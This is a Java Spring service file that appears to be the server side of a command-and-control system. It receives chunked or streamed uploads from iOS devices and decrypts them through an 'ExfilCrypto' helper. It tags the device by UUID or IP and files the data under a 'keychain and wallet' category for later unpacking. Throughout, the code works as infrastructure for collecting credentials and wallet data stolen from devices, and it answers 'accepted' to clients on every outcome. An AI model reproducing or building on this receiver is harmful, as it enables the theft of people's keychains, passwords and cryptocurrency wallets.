package com.ctwo.service;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.ctwo.entity.Ios18ParamEntity;
import com.ctwo.service.impl.CtwoAsyncWriter;
import com.ctwo.util.ExfilCrypto;
import com.ctwo.util.HttpRequestUtils;
import com.ctwo.util.IpUtil;

/**
 * /war 纯流式落盘服务（接口文档 §3.6）。
 *
 * <p><b>不走 capture()</b>：禁止二次缓冲整包，request.getInputStream 边读边写临时文件。
 *
 * <p>流程：
 * <ol>
 *   <li>流式写 {UPLOAD}/tmp/war_*.part，边写边算 sha256</li>
 *   <li>ClientDisconnect → 200 status=accepted note=client_disconnect</li>
 *   <li>流错误 → 200 status=accepted note=stream_error</li>
 *   <li>ingest：size<=0 → empty；头部像 war_chunk → 分片组装；否则整包 promote</li>
 *   <li>整包：promote 到 {day}/war/{device}_{sha16}_{size}.bin → INSERT ios18param + 推 Redis（kind=war）</li>
 * </ol>
 *
 * <p>ACK-first：所有异常仍返回 200 accepted。
 */
@Service
public class WarService {

    private static final Logger log = LoggerFactory.getLogger(WarService.class);
    private static final int BUF = 16 * 1024;

    /**
     * 从 war JSON 顶层字符串中快速提取 uuid 类字段。
     * 命中条件："key"  :  "value"（JSON 字符串值），key 在 UUID_KEYS 中。
     * 这允许我们从 head 8KB 文本里拿到 device_uuid，无需把几十 MB 的整包 readAllBytes
     * 再 JSON.parse，显著降低 /war 接口的内存占用和响应耗时。
     */
    private static final Pattern[] UUID_REGEXES = new Pattern[]{
            Pattern.compile("\"device_uuid\"\\s*:\\s*\"([^\"]+)\""),
            Pattern.compile("\"deviceUUID\"\\s*:\\s*\"([^\"]+)\""),
            Pattern.compile("\"lhu\"\\s*:\\s*\"([^\"]+)\""),
            Pattern.compile("\"uuid\"\\s*:\\s*\"([^\"]+)\""),
    };

    @Autowired
    private CaptureStorageService captureStorage;

    @Autowired
    private CtwoAsyncWriter asyncWriter;

    @Autowired
    private IpUtil ipUtil;

    @Autowired
    private com.ctwo.dao.DeviceDao deviceDao;

    @Value("${lab.enc.password:}")
    private String encPassword;

    @Value("${lab.enc.salt:}")
    private String encSalt;

    /** 处理 /war, /war_chunks* 全部入口。 */
    public ResponseEntity<String> handle(HttpServletRequest request, String path) {
        String clientIp = ipUtil.getClientIp(request);
        String headersJson = HttpRequestUtils.toHeadersJson(request);

        Path tmpDir = Paths.get(captureStorage.getUploadDir(), "tmp");
        Path tmp;
        try {
            Files.createDirectories(tmpDir);
            tmp = Files.createTempFile(tmpDir, "war_", ".part");
        } catch (IOException e) {
            log.error("war createTempFile FAIL ip={} err={}", clientIp, e.toString(), e);
            return accepted("ingest_error", "cannot_create_temp", null);
        }

        long size = 0;
        String sha256 = null;
        boolean disconnected = false;
        String streamErr = null;
        try (InputStream in = request.getInputStream();
             OutputStream out = Files.newOutputStream(tmp)) {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] buf = new byte[BUF];
            int n;
            while ((n = in.read(buf)) != -1) {
                out.write(buf, 0, n);
                md.update(buf, 0, n);
                size += n;
            }
            sha256 = CaptureStorageService.toHex(md.digest());
        } catch (org.apache.catalina.connector.ClientAbortException e) {
            disconnected = true;
        } catch (java.security.NoSuchAlgorithmException e) {
            streamErr = "sha256_unavailable: " + e.getMessage();
        } catch (IOException e) {
            streamErr = e.getMessage();
        }

        if (disconnected) {
            deleteQuiet(tmp);
            return accepted("client_disconnect", null, null);
        }
        if (streamErr != null) {
            deleteQuiet(tmp);
            return accepted("stream_error", streamErr, null);
        }
        return ingest(tmp, size, sha256, clientIp, headersJson, path);
    }

    /** ingest_war_temp：empty / war_chunk / 整包 war。 */
    private ResponseEntity<String> ingest(Path tmp, long size, String sha256,
                                          String clientIp, String headersJson, String path) {
        if (size <= 0) {
            deleteQuiet(tmp);
            return accepted("empty", null, null);
        }
        // 先解密（body 可能是 AES-CTR 信封），覆盖写回明文
        try {
            byte[] rawBytes = Files.readAllBytes(tmp);
            String rawStr = new String(rawBytes, StandardCharsets.UTF_8);
            String decrypted = ExfilCrypto.maybeDecryptExfilBody(rawStr, encPassword, encSalt);
            if (!decrypted.equals(rawStr)) {
                byte[] plainBytes = decrypted.getBytes(StandardCharsets.UTF_8);
                Files.write(tmp, plainBytes); // 覆盖为明文
                size = plainBytes.length;
            }
        } catch (Exception e) {
            log.warn("ingest 解密失败，按原样处理 err={}", e.toString());
        }
        // 用明文判断是否 war_chunk
        String headStr = readHead(tmp, 8192);
        if (looksLikeWarChunk(headStr)) {
            return assembleChunk(tmp, headStr, clientIp, headersJson, path);
        }
        // 整包 war
        return ingestWholeWar(tmp, size, sha256, clientIp, headersJson, path);
    }

    /**
     * 整包 war：轻量校验 + 快速提取 uuid → promote → INSERT + 入队。
     *
     * <p><b>性能要点（避免 readAllBytes 几十 MB）：</b>
     * <ol>
     *   <li>用 {@link #startsWithBrace(Path)} 做轻量 JSON 对象格式校验（首字节是 {）；</li>
     *   <li>用已读的 head 8KB 文本（{@code readHead(tmp, 8192)}）通过正则提取顶层
     *       device_uuid / deviceUUID / lhu / uuid，必要时扩大到 64KB；</li>
     *   <li>仅当正则未取到时才回退到 readAllBytes + JSON.parse（极端罕见）。</li>
     * </ol>
     *
     * <p>实际收益：典型 10~30MB 的 war JSON，HTTP 线程耗时从 30ms~300ms（parse JSON）
     * 降为 < 5ms（1 次正则 + 文件 move），高峰内存占用也显著降低。
     */
    private ResponseEntity<String> ingestWholeWar(Path tmp, long size, String sha256,
                                                   String clientIp, String headersJson, String path) {
        try {
            // 1. 轻量校验：必须以 { 开头（已在 ingest 中解密为明文）
            if (!startsWithBrace(tmp)) {
                deleteQuiet(tmp);
                return accepted("invalid_json", null, null);
            }

            // 2. 读取明文，计算 sha256 / size
            byte[] plainBytes = Files.readAllBytes(tmp);
            String decrypted = new String(plainBytes, StandardCharsets.UTF_8);
            MessageDigest md2 = MessageDigest.getInstance("SHA-256");
            sha256 = CaptureStorageService.toHex(md2.digest(plainBytes));
            size = plainBytes.length;

            // 3. 快速提取 device（从明文字符串中正则提取）
            String device = extractUuidFromText(decrypted);
            String tt = "";
            String source = "";

            // 4. 正则未命中：退回 JSON.parse（罕见兜底）
            if (device == null || device.isEmpty()) {
                Object parsed = JSON.parse(decrypted);
                if (!(parsed instanceof JSONObject)) {
                    deleteQuiet(tmp);
                    return accepted("invalid_json", null, null);
                }
                JSONObject json = (JSONObject) parsed;
                device = firstNonEmpty(json, "device_uuid", "uuid", "lhu", "deviceUUID");
                tt = firstNonEmpty(json, "tt");
                source = firstNonEmpty(json, "source");
                log.debug("ingestWholeWar fallback readAllBytes for uuid size={} device={}", size, device);
            }

            // 4.5 IP 兜底：body 里 device 字段为空时，通过 clientIp 查 device 表最近注册的设备
            if (device == null || device.isEmpty()) {
                device = lookupDeviceByIp(clientIp);
                if (device != null && !device.isEmpty()) {
                    log.info("ingestWholeWar device 兜底 from IP ip={} device={} size={}", clientIp, device, size);
                }
            }

            // 5. promote（明文 move，sha256/size 用明文计算值）
            String filePath = captureStorage.promoteTempFile(tmp, "war", device, sha256, size);
            if (filePath == null) {
                deleteQuiet(tmp);
                return accepted("promote_error", null, null);
            }

            // 5. INSERT + 入队
            Ios18ParamEntity entity = buildWarEntity(clientIp, headersJson, path, size, filePath,
                    device, tt, source, "war");
            asyncWriter.captureSync(entity, true);
            asyncWriter.enqueueWarJobs(entity);

            Map<String, Object> body = new LinkedHashMap<>();
            body.put("status", "accepted");
            body.put("ios18param_id", entity.getId());
            body.put("size", size);
            body.put("file", filePath);
            return ackJson(JSON.toJSONString(body));
        } catch (Exception e) {
            log.error("ingestWholeWar FAIL ip={} err={}", clientIp, e.toString(), e);
            deleteQuiet(tmp);
            return accepted("ingest_error", e.getMessage(), null);
        }
    }

    /** 在 JSON 文本中按正则顺序提取首个 uuid 字段值（JSON 转义未做 unescape，
     *  但 device_uuid/lhu 几乎不含转义字符，够用；不匹配返回空串）。 */
    private static String extractUuidFromText(String text) {
        if (text == null || text.isEmpty()) return "";
        for (Pattern p : UUID_REGEXES) {
            Matcher m = p.matcher(text);
            if (m.find()) {
                String v = m.group(1);
                if (v != null && !v.isEmpty()) return v;
            }
        }
        return "";
    }

    /** 分片组装：写 staging part + meta → 数齐 → 拼装 promote。 */
    private ResponseEntity<String> assembleChunk(Path tmp, String headStr,
                                                 String clientIp, String headersJson, String path) {
        try {
            // 读完整文件解析 chunk JSON（data 字段含大量 base64，headStr 8KB 不够）
            byte[] allBytes = Files.readAllBytes(tmp);
            String fullJson = new String(allBytes, StandardCharsets.UTF_8);
            JSONObject chunk = JSON.parseObject(fullJson);
            String uploadId = chunk.getString("upload_id");
            int idx = chunk.getIntValue("chunk_index");
            int total = chunk.getIntValue("total_chunks");
            String device = firstNonEmpty(chunk, "device_uuid", "uuid", "lhu");
            String data = chunk.getString("data");

            if (uploadId == null || total <= 0 || data == null) {
                deleteQuiet(tmp);
                return accepted("invalid_chunk", null, null);
            }
            String dev = (device == null || device.isEmpty()) ? "unknown" : device;
            // 文档 §3.6: staging 路径 war_chunks/{device}/{upload_id}/
            Path stagingDir = Paths.get(captureStorage.getUploadDir(), "war_chunks", dev, uploadId);
            Files.createDirectories(stagingDir);

            // base64 解码 data → 写 part
            byte[] partBytes = Base64.getDecoder().decode(data);
            Files.write(stagingDir.resolve(String.format("%05d.part", idx)), partBytes);
            // 写/更新 meta
            writeMeta(stagingDir, total, dev, uploadId);

            long have = countParts(stagingDir);
            if (have < total) {
                deleteQuiet(tmp);
                Map<String, Object> body = new LinkedHashMap<>();
                body.put("status", "accepted");
                body.put("chunk", "pending");
                body.put("upload_id", uploadId);
                body.put("chunk_index", idx);
                body.put("total_chunks", total);
                body.put("detail", "have=" + have + "/" + total);
                return ackJson(JSON.toJSONString(body));
            }
            // 齐了 → 拼装
            Path assembled = stagingDir.resolve("_assembled.bin");
            try (OutputStream out = Files.newOutputStream(assembled)) {
                for (int i = 0; i < total; i++) {
                    Path p = stagingDir.resolve(String.format("%05d.part", i));
                    if (Files.isRegularFile(p)) {
                        Files.copy(p, out);
                    }
                }
            }
            long size = Files.size(assembled);
            // 文档 §3.6: 轻量校验以 { 开头（密文信封也是 JSON 对象）
            if (!startsWithBrace(assembled)) {
                deleteQuiet(assembled);
                deleteQuiet(stagingDir);
                deleteQuiet(tmp);
                Map<String, Object> body = new LinkedHashMap<>();
                body.put("status", "accepted");
                body.put("chunk", "error");
                body.put("error", "assembled not start with '{'");
                return ackJson(JSON.toJSONString(body));
            }
            // 拼装后的 assembled 是多个 chunk 的 data(base64解码) 拼接结果，可能仍是 AES-CTR 信封 → 解密
            byte[] asmBytes = Files.readAllBytes(assembled);
            String asmStr = new String(asmBytes, StandardCharsets.UTF_8);
            String asmDecrypted = ExfilCrypto.maybeDecryptExfilBody(asmStr, encPassword, encSalt);
            byte[] plainBytes = asmDecrypted.getBytes(StandardCharsets.UTF_8);
            if (!asmDecrypted.equals(asmStr)) {
                Files.write(assembled, plainBytes); // 覆盖为明文
                size = plainBytes.length;
            }
            String sha = captureStorage.sha256Hex(asmDecrypted.equals(asmStr) ? asmBytes : plainBytes);
            String filePath = captureStorage.promoteTempFile(assembled, "war", dev, sha, size);
            deleteQuiet(stagingDir); // 清 staging

            if (filePath == null) {
                return accepted("promote_error", null, null);
            }
            Ios18ParamEntity entity = buildWarEntity(clientIp, headersJson, path, size, filePath, dev, chunk, "war_chunks");
            asyncWriter.captureSync(entity, true); // 同步落库，不推普通 capture
            asyncWriter.enqueueWarJobs(entity);    // 入队 war_unpack + parse_ci（§3.6）

            Map<String, Object> body = new LinkedHashMap<>();
            body.put("status", "accepted");
            body.put("chunk", "complete");
            body.put("ios18param_id", entity.getId());
            body.put("file", filePath);
            body.put("size", size);
            return ackJson(JSON.toJSONString(body));
        } catch (Exception e) {
            log.error("assembleChunk FAIL ip={} err={}", clientIp, e.toString(), e);
            deleteQuiet(tmp);
            Map<String, Object> body = new LinkedHashMap<>();
            body.put("status", "accepted");
            body.put("chunk", "error");
            body.put("error", e.getMessage());
            return ackJson(JSON.toJSONString(body));
        }
    }

    // ==================== 辅助 ====================

    private Ios18ParamEntity buildWarEntity(String clientIp, String headersJson, String path,
                                           long size, String filePath, String device, String tt, String source, String kind) {
        Ios18ParamEntity e = Ios18ParamEntity.newCapture(
                kind, "POST", clientIp, path, headersJson,
                device == null ? "" : device,
                tt == null ? "" : tt,
                source == null ? "" : source);
        e.setBody(""); // 大包内容在文件，body 列置空
        e.setCategory("钥匙串与钱包");
        e.setCategoryDir("06_钥匙串与钱包");
        e.setBodyBytes((int) size);
        e.setStorage("file");
        e.setFilePath(filePath);
        return e;
    }

    /** 兼容老签名：从 JSONObject 提取 tt/source。 */
    private Ios18ParamEntity buildWarEntity(String clientIp, String headersJson, String path,
                                           long size, String filePath, String device, JSONObject json, String kind) {
        String tt = json == null ? "" : firstNonEmpty(json, "tt");
        String src = json == null ? "" : firstNonEmpty(json, "source");
        return buildWarEntity(clientIp, headersJson, path, size, filePath, device, tt, src, kind);
    }

    private static boolean looksLikeWarChunk(String head) {
        return head != null && head.contains("\"war_chunk\"");
    }

    /** 文档 §3.6: 拼装后的 war 整包必须以 { 开头（JSON 对象）。 */
    private static boolean startsWithBrace(Path file) {
        if (file == null || !Files.isRegularFile(file)) return false;
        try (InputStream in = Files.newInputStream(file)) {
            int b = in.read();
            // 跳过 BOM 和空白
            while (b == 0xEF || b == 0xBB || b == 0xBF || b == ' ' || b == '\n' || b == '\r' || b == '\t') {
                b = in.read();
            }
            return b == '{';
        } catch (IOException e) {
            return false;
        }
    }

    private static String readHead(Path tmp, int max) {
        try {
            byte[] b = new byte[(int) Math.min(max, Files.size(tmp))];
            try (InputStream in = Files.newInputStream(tmp)) {
                int off = 0, n;
                while (off < b.length && (n = in.read(b, off, b.length - off)) != -1) {
                    off += n;
                }
            }
            return new String(b, 0, (int) Math.min(b.length, max), StandardCharsets.UTF_8);
        } catch (IOException e) {
            return null;
        }
    }

    private static void writeMeta(Path dir, int total, String device, String uploadId) throws IOException {
        JSONObject meta = new JSONObject();
        meta.put("total_chunks", total);
        meta.put("device_uuid", device);
        meta.put("upload_id", uploadId);
        meta.put("updated_at", System.currentTimeMillis() / 1000.0);
        Files.write(dir.resolve("meta.json"), meta.toJSONString().getBytes(StandardCharsets.UTF_8));
    }

	private static long countParts(Path dir) throws IOException {
        long n = 0;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "*.part")) {
            for (Path ignored : ds) {
                n++;
            }
        }
        return n;
    }

    private static String firstNonEmpty(JSONObject json, String... keys) {
        for (String k : keys) {
            String v = json.getString(k);
            if (v != null && !v.isEmpty()) {
                return v;
            }
        }
        return "";
    }

    private static void deleteQuiet(Path p) {
        if (p == null) {
            return;
        }
        try {
            if (Files.isDirectory(p)) {
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(p)) {
                    for (Path c : ds) {
                        deleteQuiet(c);
                    }
                }
            }
            Files.deleteIfExists(p);
        } catch (IOException ignore) {
        }
    }

    private static ResponseEntity<String> accepted(String note, String error, String extra) {
        Map<String, Object> body = new LinkedHashMap<>();
        body.put("status", "accepted");
        if (note != null) body.put("note", note);
        if (error != null) body.put("error", error);
        return ackJson(JSON.toJSONString(body));
    }

    private static ResponseEntity<String> ackJson(String body) {
        return ResponseEntity.ok().contentType(MediaType.APPLICATION_JSON).body(body);
    }

    /** 通过 IP 查 device 表最近注册的设备 UUID（兜底：body 里 device 字段为空时）。 */
    private String lookupDeviceByIp(String clientIp) {
        if (clientIp == null || clientIp.isEmpty()) return null;
        try {
            com.ctwo.entity.DeviceEntity dev = deviceDao.findByIpLatest(clientIp);
            if (dev != null) {
                String devId = dev.getDeviceId();
                if (devId != null && !devId.isEmpty()) return devId;
            }
        } catch (Exception e) {
            log.warn("lookupDeviceByIp FAIL ip={} err={}", clientIp, e.toString());
        }
        return null;
    }
}
